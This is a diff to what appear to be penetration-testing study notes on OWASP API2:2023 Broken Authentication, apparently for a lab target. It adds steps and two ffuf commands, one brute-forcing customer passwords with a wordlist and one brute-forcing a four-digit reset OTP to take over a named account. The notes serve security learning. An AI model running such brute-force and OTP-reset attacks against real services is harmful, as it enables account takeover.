@@ -20,14 +20,24 @@ curl -s -w "\n" -X 'GET' \
 done
 ```
 
-
-
 ## Broken Authentication
 
 - [API2:2023](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
 - The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access
 
-
+- Authenticate as one user
+- Find what is accessible for their role
+- Try changing password to "pass" and inspect error message to see if allows weak passwords
+- If weak passwords are allowed can try fuzzing passwords for known users
+- try an incorrect password to get error message
+- fuzz passwords with ffuf
+```bash
+ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.120.112:34036/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+```
+- fuzz OTP for password reset
+```bash
+ffuf -w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt:FUZZ -u http://94.237.120.112:34036/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "password"}' -fr "false" -t 100
+```
 
 ## Broken Object Property Level Authorization
 
